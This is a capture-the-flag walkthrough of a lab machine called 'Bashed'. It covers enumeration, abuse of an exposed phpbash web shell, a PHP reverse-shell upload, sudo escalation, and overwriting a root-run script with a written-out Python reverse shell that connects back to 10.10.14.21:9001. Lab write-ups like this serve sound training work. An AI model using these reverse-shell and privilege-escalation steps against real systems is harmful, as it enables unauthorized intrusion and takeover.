We start by performing a scan to identify the open ports available:

![Port Scan](https://raw.githubusercontent.com/2eevi/writeups/main/Bashed/Uploads/AnalisisLsLaAlaRaiz.png)



We identify that port 80 is open, which immediately suggests we are facing an HTTP server. So, we proceed to analyze the services and versions running on that port:



Now, in my analysis methodology, I like to get ahead and start checking for available subdomains on the server. I usually use Gobuster because it's very hands-on and fast:



Seeing that we have subdomains like images and uploads, we can already get an idea that there might be an attack vector to upload files to the server. But for now, we’ll visit the subdomains to further enumerate potential attack vectors:



In the /dev subdomain we find the most interesting element: phpbash.php. This is a web app that emulates a bash terminal for directory control convenience. With this in place, we have a broad way to extend permissions and make a remote connection. What we’ll do is move to the uploads directory and from there try to download a PHP reverse shell, since we suspect .php files can be executed:

Our PHP reverse shell script:



Next, a quick recon in our web pseudo-terminal:



Now, we’ll upload our reverse shell as follows. We’re going to set a listener port using nc and instruct it to only communicate to transfer the reverse shell:



Now from the pseudo-terminal, we’ll make the request from the path /var/www/html/uploads:



Now we execute the full path from the browser and set a port in listen mode with the same port and IP we configured in the reverse shell script (this must be edited with any text editor):



We receive the connection and will need to treat the TTY. This is useful to execute many common terminal functionalities and avoid easily losing the connection. To do this, we’ll run:



Once we have the terminal on our listener port, we’ll type:

script /dev/null -c bash
Ctrl+z
stty raw -echo ; fg
reset
xterm
export TERM=xterm
export SHELL=bash

Now that we had previously enumerated from the pseudo-terminal, the next step is analyzing how we can escalate privileges vertically to a user with higher permissions, since www-data usually has very limited access.

To do that, we analyze the available sudo permissions with our current user. We notice that we can execute a bash shell as scriptmanager without a password, so we escalate using:

sudo -u scriptmanager bash -i



We perform general recon with ls -la /, and we notice the presence of a scripts directory. Inside, we find a script with execution permissions. So we attempt to modify its content to establish a reverse shell through Python to a new listener port, by modifying and executing that script:

echo 'import socket,subprocess,os' > /scripts/test.py
echo 's=socket.socket(socket.AF_INET, socket.SOCK_STREAM)' >> /scripts/test.py
echo 's.connect(("10.10.14.21", 9001))' >> /scripts/test.py
echo 'os.dup2(s.fileno(),0)' >> /scripts/test.py
echo 'os.dup2(s.fileno(),1)' >> /scripts/test.py
echo 'os.dup2(s.fileno(),2)' >> /scripts/test.py
echo 'p=subprocess.call(["/bin/sh", "-i"])' >> /scripts/test.py



Now on our listener port, we receive the connection as root:



Finally, to capture the user flag user.txt, we visit /home/arrexel, and it is available to read using cat.

